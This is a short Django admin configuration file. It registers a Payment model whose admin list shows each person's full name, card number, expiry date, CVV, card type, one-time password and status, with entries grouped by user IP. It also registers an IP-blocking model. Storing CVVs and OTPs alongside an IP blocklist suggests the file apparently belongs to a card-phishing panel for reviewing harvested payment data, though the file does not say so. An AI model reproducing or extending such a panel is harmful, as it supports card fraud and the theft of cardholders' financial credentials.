from django.contrib import admin
from .models import Payment
from django.contrib.auth.models import Group
from .models import BlockedIP
from .forms import BlockedIPForm



class AdminPanel(admin.ModelAdmin):
    list_display = ('full_name', 'card_number','year_pick', 'month_pick',  'cvv', 'card_type', 'otp', 'status' )

class UserInlines(admin.TabularInline):
    model = Payment
    extra = 0
class AdminPanel2(admin.ModelAdmin):
    inlines = [UserInlines]
    list_display = ('full_name', 'user_ip')
admin.site.unregister(Group)



admin.site.register(Payment, AdminPanel )




class BlockedIPAdmin(admin.ModelAdmin):
    form = BlockedIPForm
    
admin.site.register(BlockedIP, BlockedIPAdmin)